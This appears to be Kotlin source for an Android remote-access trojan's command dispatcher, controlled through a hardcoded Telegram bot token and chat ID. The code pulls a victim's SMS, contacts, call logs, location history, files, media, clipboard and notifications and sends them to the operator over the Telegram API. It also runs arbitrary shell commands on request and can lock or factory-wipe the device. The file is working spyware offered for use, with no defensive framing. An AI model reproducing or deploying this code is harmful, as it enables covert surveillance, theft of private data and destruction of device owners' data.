package com.spud.ratc2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder

class Dispatcher(private val ctx: Context) {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"
    private val c = Collectors(ctx)
    @Volatile private var offset = 0L

    fun loop() {
        while (true) {
            try { tick() } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun tick() {
        val body = Sender.get("$BASE/getUpdates?offset=$offset&timeout=25")
        val root = JSONObject(body)
        if (!root.optBoolean("ok")) return
        val arr = root.optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            offset = u.getLong("update_id") + 1
            val cb = u.optJSONObject("callback_query")
            if (cb != null) {
                val chatId = cb.getJSONObject("message").getJSONObject("chat").getString("id")
                val data = cb.optString("data", "")
                val cbId = cb.getString("id")
                answer(cbId)
                if (chatId == MY_CHAT) {
                    doAction(chatId, data)
                    if (data != "menu") menu(chatId)
                }
                continue
            }
            val m = u.optJSONObject("message") ?: continue
            val chatId = m.getJSONObject("chat").getString("id")
            val text = m.optString("text", "")
            if (text.isBlank() || chatId != MY_CHAT) continue
            if (text.startsWith("/start") || text.startsWith("/help")) menu(chatId)
            else if (text.startsWith("/shell ")) {
                val out = shell(text.removePrefix("/shell "))
                Sender.sendDocument(BASE, chatId, "shell_out.txt", out)
            }
        }
    }

    private fun doAction(chatId: String, data: String) {
        when (data) {
            "device"      -> file(chatId, "device.txt", c.deviceInfo())
            "battery"     -> file(chatId, "battery_storage.txt", c.batteryStorage())
            "storage"     -> file(chatId, "storage.txt", c.storage())
            "network"     -> file(chatId, "network.txt", c.network())
            "location"    -> file(chatId, "location.txt", c.location())
            "lochist"     -> file(chatId, "location_history.txt", c.locationHistory())
            "sms20"       -> file(chatId, "sms_20.txt", c.sms(20))
            "sms50"       -> file(chatId, "sms_50.txt", c.sms(50))
            "smsin"       -> file(chatId, "sms_inbox.txt", c.sms(100, "inbox"))
            "smsout"      -> file(chatId, "sms_sent.txt", c.sms(100, "sent"))
            "contacts30"  -> file(chatId, "contacts_30.txt", c.contacts(30))
            "contacts100" -> file(chatId, "contacts_100.txt", c.contacts(100))
            "emails"      -> file(chatId, "emails.txt", c.emails())
            "contactsall" -> file(chatId, "contacts_all.txt", c.contacts(9999))
            "calls20"     -> file(chatId, "calls_20.txt", c.calls(20))
            "calls50"     -> file(chatId, "calls_50.txt", c.calls(50))
            "callsin"     -> file(chatId, "calls_incoming.txt", c.calls(100, "in"))
            "callsout"    -> file(chatId, "calls_outgoing.txt", c.calls(100, "out"))
            "callsmiss"   -> file(chatId, "calls_missed.txt", c.calls(100, "miss"))
            "sdcard"      -> file(chatId, "sdcard.txt", c.files("/sdcard"))
            "downloads"   -> file(chatId, "downloads.txt", c.files("/sdcard/Download"))
            "images"      -> file(chatId, "images_50.txt", c.mediaImages(50))
            "videos"      -> file(chatId, "videos_20.txt", c.mediaVideos(20))
            "audio"       -> file(chatId, "audio_30.txt", c.mediaAudio(30))
            "docs"        -> file(chatId, "documents_30.txt", c.documents(30))
            "apps"        -> file(chatId, "apps_all.txt", c.apps())
            "sysapps"     -> file(chatId, "apps_system.txt", c.systemApps())
            "clipboard"   -> file(chatId, "clipboard.txt", c.clipboard())
            "notifs"      -> file(chatId, "notifications.txt", c.notifications())
            "lock"        -> lock(chatId)
            "wipe"        -> wipe(chatId)
            "menu"        -> {}
            else          -> send(chatId, "زر غير معروف: $data")
        }
    }

    private fun file(chatId: String, name: String, content: String) {
        Sender.sendDocument(BASE, chatId, name, content)
    }

    private fun lock(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.lockNow()
            send(chatId, "🔒 تم القفل")
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun wipe(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.wipeData(0)
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun shell(cmd: String): String = try {
        val p = ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out.ifBlank { "(مافي ناتج)" }
    } catch (e: Exception) { "خطأ: ${e.message}" }

    private fun send(chatId: String, text: String) {
        try {
            val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            Sender.post("$BASE/sendMessage", p)
        } catch (_: Exception) {}
    }

    private fun menu(chatId: String) {
        val kb = JSONArray().apply {
            put(row(b("📱 الجهاز", "device"),       b("🔋 بطارية+رام", "battery")))
            put(row(b("💾 التخزين", "storage"),     b("🌐 IP والشبكة", "network")))
            put(row(b("📍 الموقع", "location"),     b("🗺️ آخر مواقع", "lochist")))
            put(row(b("💬 SMS 20", "sms20"),        b("💬 SMS 50", "sms50")))
            put(row(b("📥 SMS واردة", "smsin"),     b("📤 SMS صادرة", "smsout")))
            put(row(b("👥 30 جهة", "contacts30"),   b("👥 100 جهة", "contacts100")))
            put(row(b("📧 الإيميلات", "emails"),    b("👥 كل الجهات", "contactsall")))
            put(row(b("📞 مكالمات 20", "calls20"),  b("📞 مكالمات 50", "calls50")))
            put(row(b("📥 مكالمات واردة", "callsin"), b("📤 مكالمات صادرة", "callsout")))
            put(row(b("❌ مكالمات فائتة", "callsmiss")))
            put(row(b("📂 /sdcard", "sdcard"),      b("📁 التنزيلات", "downloads")))
            put(row(b("🖼️ الصور", "images"),        b("🎬 الفيديو", "videos")))
            put(row(b("🎵 الموسيقى", "audio"),      b("📄 المستندات", "docs")))
            put(row(b("📦 كل التطبيقات", "apps"),    b("⚙️ تطبيقات النظام", "sysapps")))
            put(row(b("📋 الحافظة", "clipboard"),    b("🔔 الإشعارات", "notifs")))
            put(row(b("🔒 قفل الشاشة", "lock"),     b("🗑️ تنسيق", "wipe")))
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        val p = "chat_id=$chatId&text=" + URLEncoder.encode("🎛️ لوحة التحكم — ٢٦ زر", "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
        try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
    }

    private fun row(vararg items: JSONObject): JSONArray {
        val a = JSONArray()
        for (x in items) a.put(x)
        return a
    }

    private fun b(t: String, d: String) = JSONObject().put("text", t).put("callback_data", d)

    private fun answer(id: String) {
        try { Sender.post("$BASE/answerCallbackQuery", "callback_query_id=$id") } catch (_: Exception) {}
    }
}
